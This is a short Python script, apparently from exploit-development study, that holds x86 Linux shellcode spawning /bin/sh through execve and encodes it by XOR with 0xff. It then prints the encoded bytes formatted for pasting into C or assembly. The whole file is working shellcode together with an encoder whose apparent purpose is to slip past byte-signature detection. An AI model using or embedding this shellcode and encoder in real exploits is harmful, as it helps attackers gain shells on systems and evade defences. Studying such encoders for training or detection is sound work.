#! /usr/bin/python3

shell_code = bytearray(b"\xeb\x10\x5b\x31\xc0\x50\x89\xe2\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68")
not_operand = bytearray(b"\xff")
encoded_shell_code = bytearray(b'')


for i in range(len(shell_code)):
    result = shell_code[i] ^ not_operand[0]
    encoded_shell_code += result.to_bytes(1, 'big')



hex_vals = encoded_shell_code.hex()
hex_bytes = []
hex_bytes_comma = []

for index, hexchhar in enumerate(hex_vals):
    if(index % 2 == 1):
        hex_bytes.append(hex_vals[index - 1] + hex_vals[index])
        hex_bytes_comma.append(hex_vals[index - 1] + hex_vals[index]+",")

hex_bytes_formatted = "\\x".join(hex_bytes)
hex_bytes_comma_formatted = "0x".join(hex_bytes_comma).rstrip(",")


print(f"Size of Shellcode: {len(hex_bytes)}")

print()

print("For C:")
print(f'\\x{hex_bytes_formatted}')

print()

print("For Assembly:")
print(f'0x{hex_bytes_comma_formatted}')
